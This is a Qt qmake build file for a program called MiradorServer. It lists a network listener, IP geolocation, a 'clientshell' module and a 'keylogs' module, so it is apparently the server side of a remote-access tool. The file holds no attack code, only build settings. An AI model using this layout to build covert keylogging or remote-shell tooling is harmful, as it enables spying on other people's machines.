QT       += core gui network

greaterThan(QT_MAJOR_VERSION, 4): QT += widgets

CONFIG += c++11

# The following define makes your compiler emit warnings if you use
# any Qt feature that has been marked deprecated (the exact warnings
# depend on your compiler). Please consult the documentation of the
# deprecated API in order to know how to port your code away from it.
DEFINES += QT_DEPRECATED_WARNINGS

win32:LIBS += -lws2_32

# You can also make your code fail to compile if it uses deprecated APIs.
# In order to do so, uncomment the following line.
# You can also select to disable deprecated APIs only up to a certain version of Qt.
#DEFINES += QT_DISABLE_DEPRECATED_BEFORE=0x060000    # disables all the APIs deprecated before Qt 6.0.0

SOURCES += \
    libgeo++/GeoLite2PP.cpp \
    libgeo++/GeoLite2PP_error_category.cpp \
    libgeo++/data-pool.c \
    libgeo++/maxminddb.c \
    listener.cpp \
    main.cpp \
    mainwindow.cpp \
    modules/clientshell.cpp \
    modules/keylogs.cpp

HEADERS += \
    libgeo++/GeoLite2PP.hpp \
    libgeo++/GeoLite2PP_error_category.hpp \
    libgeo++/GeoLite2PP_version.hpp \
    libgeo++/data-pool.h \
    libgeo++/maxminddb-compat-util.h \
    libgeo++/maxminddb.h \
    libgeo++/maxminddb_config.h \
    listener.h \
    mainwindow.h \
    modules/clientshell.h \
    modules/keylogs.h

FORMS += \
    mainwindow.ui \
    modules/clientshell.ui

TRANSLATIONS += \
    MiradorServer_fr_FR.ts

# Default rules for deployment.
#qnx: target.path = /tmp/$${TARGET}/bin
#"else: unix:!android: target.path = /opt/$${TARGET}/bin
#!isEmpty(target.path): INSTALLS += target

RESOURCES += \
    res.qrc

DISTFILES += \
    libgeo++/GeoLite2PP_version.hpp.in \
    libgeo++/libmaxminddb.pc.in
